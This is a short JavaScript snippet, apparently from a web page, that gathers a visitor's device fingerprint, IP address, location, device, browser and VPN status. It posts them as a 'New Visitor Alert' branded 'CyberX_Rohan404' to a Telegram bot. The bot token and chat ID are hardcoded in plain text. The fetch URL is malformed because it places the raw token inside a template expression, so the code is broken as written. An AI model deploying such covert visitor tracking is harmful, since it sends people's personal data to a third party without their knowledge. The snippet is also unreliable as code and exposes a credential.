const TELEGRAM_TOKEN = "7655435661:AAGvQFoUKanmBZaZXND5AXbrPuClcYM9XIk";
const CHAT_ID = "6396297682";

async function sendTelegramMessage(data) {
  const message = `
📡 *New Visitor Alert - CyberX_Rohan404*
🧠 *Device Fingerprint:* ${data.fingerprint}
📍 *Location:* ${data.city}, ${data.region}, ${data.country}
🕹️ *IP:* ${data.ip}
💻 *Device:* ${data.device}
🌐 *Browser:* ${data.browser}
🛡️ *VPN/Proxy:* ${data.vpn}
⏱️ *Time:* ${new Date().toLocaleString()}
`;

  await fetch(`https://api.telegram.org/bot${7655435661:AAGvQFoUKanmBZaZXND5AXbrPuClcYM9XIk}/sendMessage`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: 6396297682,
      text: message,
      parse_mode: "Markdown"
    })
  });
}
